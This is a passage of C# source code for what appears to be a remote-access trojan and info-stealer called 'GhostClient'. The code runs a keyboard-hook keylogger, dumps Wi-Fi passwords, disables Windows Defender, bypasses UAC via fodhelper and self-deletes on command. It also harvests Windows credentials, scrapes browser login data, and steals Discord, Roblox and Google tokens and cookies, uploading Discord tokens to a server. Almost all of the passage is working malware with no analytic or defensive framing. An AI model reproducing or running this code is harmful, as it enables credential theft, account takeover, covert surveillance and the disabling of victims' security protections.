                Type mgrType = Type.GetTypeFromProgID("WIA.DeviceManager");
                if (mgrType == null) return "ERROR: WIA not available";
                object mgr = Activator.CreateInstance(mgrType);
                var devices = (ArrayList)mgr.GetType().InvokeMember("DeviceInfos", System.Reflection.BindingFlags.GetProperty, null, mgr, null);
                if (devices == null || devices.Count == 0) return "No cameras found";
                var sb = new StringBuilder();
                sb.AppendLine("Available cameras:");
                for (int i = 0; i < devices.Count; i++)
                {
                    object dev = devices[i];
                    string name = dev.GetType().InvokeMember("Name", System.Reflection.BindingFlags.GetProperty, null, dev, null).ToString();
                    sb.AppendLine("  [" + i + "] " + name + (i == _selectedCamera ? " (selected)" : ""));
                }
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── KEYLOGGER ──
        static void StartKeylog()
        {
            _keyboardProc = KeyboardHookCallback;
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                _keyboardHookId = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        static void StopKeylog()
        {
            if (_keyboardHookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_keyboardHookId);
                _keyboardHookId = IntPtr.Zero;
            }
            _keyboardProc = null;
        }

        static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                _keylogBuffer.Append((char)vkCode);
            }
            return CallNextHookEx(_keyboardHookId, nCode, wParam, lParam);
        }

        // ── TEXT-TO-SPEECH ──
        static string SpeakText(string text)
        {
            try
            {
                Type speechType = Type.GetTypeFromProgID("SAPI.SpVoice");
                if (speechType == null) return "ERROR: SAPI not available";
                object voice = Activator.CreateInstance(speechType);
                voice.GetType().InvokeMember("Speak", System.Reflection.BindingFlags.InvokeMethod, null, voice, new object[] { text, 0 });
                return "Speaking: " + text;
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── WIFI ──
        static string ListWiFi()
        {
            return ExecuteCmd("netsh wlan show profiles | findstr \"All User Profile\"");
        }

        static string GetWiFiPassword(string ssid)
        {
            return ExecuteCmd("netsh wlan show profile name=\"" + ssid + "\" key=clear");
        }

        // ── DISABLE DEFENDER ──
        static string DisableDefender()
        {
            try
            {
                if (!IsAdmin()) return "ERROR: Admin required to disable Defender";
                string cmd = "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f";
                Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd) { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = false });
                cmd = "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
                Process.Start(new ProcessStartInfo("powershell.exe", "-Command \"Set-MpPreference -DisableRealtimeMonitoring $true -Force\"") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = false });
                return "Windows Defender disabled (requires reboot)";
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── WINDOWS PASSWORDS ──
        static string GetWindowsPasswords()
        {
            try
            {
                var sb = new StringBuilder();
                sb.AppendLine("=== WINDOWS CREDENTIALS ===");
                // WIndows Credential Manager
                string cmdOut = ExecuteCmd("cmdkey /list");
                sb.AppendLine(cmdOut);
                // SAM/SYSTEM dump attempt
                string samDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("System32", "System32\\config\\RegBack");
                if (Directory.Exists(samDir))
                {
                    sb.AppendLine("\nSAM files found at: " + samDir);
                    sb.AppendLine("Use a tool like mimikatz to extract hashes.");
                }
                sb.AppendLine("\n=== LOCAL USERS ===");
                sb.AppendLine(ExecuteCmd("net user"));
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── TOKEN GRABBER ──
        static string GrabTokens()
        {
            try
            {
                var sb = new StringBuilder();
                sb.AppendLine("=== DISCORD TOKEN SEARCH ===");
                string[] paths = new string[] {
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord",
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord",
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discordptb",
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discordcanary",
                };
                int totalFound = 0;
                foreach (string basePath in paths)
                {
                    if (!Directory.Exists(basePath)) continue;
                    string ldbPath = basePath + "\\Local Storage\\leveldb";
                    if (!Directory.Exists(ldbPath)) continue;
                    sb.AppendLine("Checking: " + basePath);
                    foreach (string f in Directory.GetFiles(ldbPath, "*.ldb"))
                    {
                        try
                        {
                            string content = File.ReadAllText(f, Encoding.UTF8);
                            var matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}");
                            foreach (Match m in matches)
                            {
                                string tok = m.Value;
                                sb.AppendLine("TOKEN: " + tok);
                                totalFound++;
                                // Upload to server
                                try {
                                    var payload = new Dictionary<string, object> {
                                        { "clientId", CLIENT_ID },
                                        { "type", "discord_token" },
                                        { "source", "Terminal Grab" },
                                        { "data", JsonEncode(new Dictionary<string, object> {
                                            { "token", tok },
                                            { "source", basePath }
                                        })}
                                    };
                                    PostJson("/api/remote/register-data", payload);
                                } catch { }
                            }
                        }
                        catch { }
                    }
                }
                sb.AppendLine("\nTotal tokens found: " + totalFound);
                if (totalFound > 0) sb.AppendLine("Tokens also uploaded to server Data panel.");
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── DISCORD INFO ──
        static string GrabDiscordInfo()
        {
            try
            {
                var sb = new StringBuilder();
                string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord";
                if (Directory.Exists(discordPath))
                {
                    sb.AppendLine("Discord installation found at: " + discordPath);
                    string settingsPath = discordPath + "\\settings.json";
                    if (File.Exists(settingsPath))
                    {
                        string settings = File.ReadAllText(settingsPath);
                        sb.AppendLine("Settings: " + settings);
                    }
                }
                string ldbDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Local Storage\\leveldb";
                if (Directory.Exists(ldbDir))
                {
                    sb.AppendLine("Discord local storage found at: " + ldbDir);
                    sb.AppendLine("Use !GRABTOKENS to extract tokens.");
                }
                // Check running processes
                foreach (var p in Process.GetProcesses())
                {
                    string name = p.ProcessName.ToLower();
                    if (name.Contains("discord") || name.Contains("discordptb") || name.Contains("discordcanary"))
                        sb.AppendLine("Discord running: " + p.ProcessName + " (PID: " + p.Id + ")");
                }
                if (sb.Length == 0) return "Discord not found on this system.";
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── STEAM INFO ──
        static string GrabSteamInfo()
        {
            try
            {
                var sb = new StringBuilder();
                string steamPath = "C:\\Program Files (x86)\\Steam";
                if (!Directory.Exists(steamPath)) steamPath = "C:\\Program Files\\Steam";
                if (Directory.Exists(steamPath))
                {
                    sb.AppendLine("Steam found at: " + steamPath);
                    string configPath = steamPath + "\\config\\config.vdf";
                    if (File.Exists(configPath))
                    {
                        string config = File.ReadAllText(configPath);
                        sb.AppendLine("Config file: " + configPath + " (" + config.Length + " bytes)");
                    }
                    string ssfnPath = steamPath + "\\ssfn*";
                    sb.AppendLine("SSFN files: " + string.Join(", ", Directory.GetFiles(steamPath, "ssfn*")));
                }
                else sb.AppendLine("Steam not found in default locations.");
                foreach (var p in Process.GetProcesses())
                    if (p.ProcessName.ToLower().Contains("steam"))
                        sb.AppendLine("Steam running (PID: " + p.Id + ")");
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── TELEGRAM INFO ──
        static string GrabTelegramInfo()
        {
            try
            {
                var sb = new StringBuilder();
                string tgPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop";
                if (Directory.Exists(tgPath))
                {
                    sb.AppendLine("Telegram found at: " + tgPath);
                    string tdata = tgPath + "\\tdata";
                    if (Directory.Exists(tdata))
                        sb.AppendLine("Session data found (tdata folder): " + tdata);
                }
                foreach (var p in Process.GetProcesses())
                    if (p.ProcessName.ToLower().Contains("telegram"))
                        sb.AppendLine("Telegram running (PID: " + p.Id + ")");
                if (sb.Length == 0) return "Telegram not found on this system.";
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── EMAIL CLIENTS ──
        static string GrabEmailClients()
        {
            try
            {
                var sb = new StringBuilder();
                string[] mailPaths = new string[] {
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Thunderbird",
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Thunderbird",
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Outlook",
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Outlook",
                };
                foreach (string p in mailPaths)
                    if (Directory.Exists(p)) sb.AppendLine("Email client data: " + p);
                foreach (var p in Process.GetProcesses())
                {
                    string n = p.ProcessName.ToLower();
                    if (n.Contains("outlook") || n.Contains("thunderbird") || n.Contains("mail"))
                        sb.AppendLine("Email client running: " + p.ProcessName);
                }
                if (sb.Length == 0) return "No email clients found.";
                return sb.ToString();
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── UAC BYPASS ──
        static string UACBypass()
        {
            try
            {
                if (IsAdmin()) return "Already running as admin";
                // fodhelper.exe UAC bypass (Windows 10/11)
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command", "", exePath);
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command", "DelegateExecute", "");
                Process.Start("fodhelper.exe");
                return "UAC bypass attempted via fodhelper. New instance should be elevated.";
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── KILL SWITCH ──
        static string KillSwitch()
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                // Remove from startup
                try
                {
                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "GhostClient", "");
                }
                catch { }
                // Delete itself via cmd script
                string batPath = Path.Combine(Path.GetTempPath(), "ghost_cleanup.bat");
                string batContent = "@echo off\n"
                    + "timeout /t 2 /nobreak >nul\n"
                    + "del /f /q \"" + exePath + "\"\n"
                    + "del /f /q \"%~f0\"";
                File.WriteAllText(batPath, batContent);
                Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"")
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                return "Kill switch activated. Client will self-delete after exit.";
            }
            catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        // ── BROWSER PASSWORDS EXTRACTION ──
        static string GrabBrowserPasswords()
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== BROWSER PASSWORD SCAN ===");
            
            string[] browsers = new string[] {
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
            };

            foreach (string loginPath in browsers)
            {
                if (!File.Exists(loginPath) && !Directory.Exists(loginPath))
                {
                    sb.AppendLine("Not found: " + Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(loginPath))));
                    continue;
                }
                
                string browserName = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(loginPath)));
                if (File.Exists(loginPath))
                {
                    sb.AppendLine("\n[+] " + browserName + " Login Data found!");
                    sb.AppendLine("    Path: " + loginPath);
                    try
                    {
                        string raw = File.ReadAllText(loginPath, Encoding.UTF8);
                        var urlMatches = Regex.Matches(raw, @"https?://[^\x00-\x1F""]+");
                        var uniqueUrls = new HashSet<string>();
                        foreach (Match m in urlMatches)
                        {
                            string u = m.Value;
                            if (u.Length > 5 && u.Length < 200 && !u.Contains("sqlite") && !u.Contains("table"))
                                uniqueUrls.Add(u);
                        }
                        sb.AppendLine("    URLs found: " + uniqueUrls.Count);
                        foreach (string url in uniqueUrls.Take(15))
                            sb.AppendLine("      " + url);
                        if (uniqueUrls.Count > 15) sb.AppendLine("      ... and " + (uniqueUrls.Count - 15) + " more");
                    }
                    catch (Exception ex) { sb.AppendLine("    Read error: " + ex.Message); }
                }
                
                // Firefox uses different format
                if (Directory.Exists(loginPath) && loginPath.Contains("Firefox"))
                {
                    try
                    {
                        var profileDirs = Directory.GetDirectories(loginPath);
                        foreach (var prof in profileDirs)
                        {
                            string loginsFile = Path.Combine(prof, "logins.json");
                            if (File.Exists(loginsFile))
                            {
                                sb.AppendLine("\n[+] Firefox logins.json found: " + prof);
                                string content = File.ReadAllText(loginsFile);
                                var hostMatches = Regex.Matches(content, @"""hostname"":\s*""([^""]+)""");
                                var userMatches = Regex.Matches(content, @"""encryptedUsername"":\s*""([^""]*)""");
                                sb.AppendLine("    Saved logins: " + hostMatches.Count);
                                foreach (Match m in hostMatches)
                                    sb.AppendLine("      " + m.Groups[1].Value);
                            }
                        }
                    } catch { }
                }
            }
            return sb.Length > 40 ? sb.ToString() : "No browser login data found.";
        }

        // ── ROBLOX COOKIE STEALER ──
        static string GrabRobloxCookies()
        {
            try
            {
                string[] cookiePaths = new string[] {
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
                };

                foreach (string cookiePath in cookiePaths)
                {
                    if (!File.Exists(cookiePath)) continue;
                    try
                    {
                        string content = File.ReadAllText(cookiePath, Encoding.UTF8);
                        // Find .ROBLOSECURITY cookie
                        var match = Regex.Match(content, @"\.ROBLOSECURITY[^\x00]*");
                        if (match.Success)
                        {
                            // Extract the cookie value
                            var valueMatch = Regex.Match(match.Value, @"([A-Za-z0-9_.\-+]+)");
                            if (valueMatch.Success && valueMatch.Value.Length > 20)
                                return valueMatch.Value;
                        }
                    } catch { }
                }
                return "";
            }
            catch { return ""; }
        }

        // ── GOOGLE COOKIES ──
        static List<Dictionary<string, string>> GrabGoogleCookies()
        {
            var accounts = new List<Dictionary<string, string>>();
            try
            {
                string[] cookiePaths = new string[] {
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies",
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
                };

                foreach (string cookiePath in cookiePaths)
                {
                    if (!File.Exists(cookiePath)) continue;
                    try
                    {
                        string content = File.ReadAllText(cookiePath, Encoding.UTF8);
                        // Look for Google account identifiers in cookies
                        var sidMatch = Regex.Match(content, @"SID[^\x00]*@gmail\.com[^\x00]*");
                        var hsidMatch = Regex.Match(content, @"__Host-GAPS[^\x00]*");
                        var osidMatch = Regex.Match(content, @"OSID[^\x00]*@gmail\.com[^\x00]*");
                        
                        if (sidMatch.Success || hsidMatch.Success)
                        {
                            var acc = new Dictionary<string, string>();
                            acc["source"] = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(cookiePath)));
                            
                            // Extract email from cookie data
                            var emailMatch = Regex.Match(content, @"([a-zA-Z0-9._%+-]+@gmail\.com)");
                            if (emailMatch.Success) acc["email"] = emailMatch.Value;
                            
                            if (sidMatch.Success) acc["SID_found"] = "true";
                            if (hsidMatch.Success) acc["GAPS_found"] = "true";
                            acc["cookie_raw"] = content.Substring(Math.Max(0, content.IndexOf("@gmail.com") - 50), Math.Min(100, content.Length - Math.Max(0, content.IndexOf("@gmail.com") - 50)));
                            
                            if (acc.ContainsKey("email") || acc.ContainsKey("SID_found"))
                                accounts.Add(acc);
                        }
                    } catch { }
                }
            } catch { }
            return accounts;
        }

        // ── DISCORD BROWSER COOKIES ──
        static string GrabDiscordBrowserCookies()
        {
            try
            {
                string[] cookiePaths = new string[] {
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies",
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
                };

                foreach (string cookiePath in cookiePaths)
                {
                    if (!File.Exists(cookiePath)) continue;
                    try
                    {
                        string content = File.ReadAllText(cookiePath, Encoding.UTF8);
                        // Discord uses specific cookie names
                        var tokenMatch = Regex.Match(content, @"discord\.com[^\x00]*token[^\x00]*");
                        if (tokenMatch.Success) return tokenMatch.Value;
                    } catch { }
                }
                return "";
            }
            catch { return ""; }
        }
    }
}
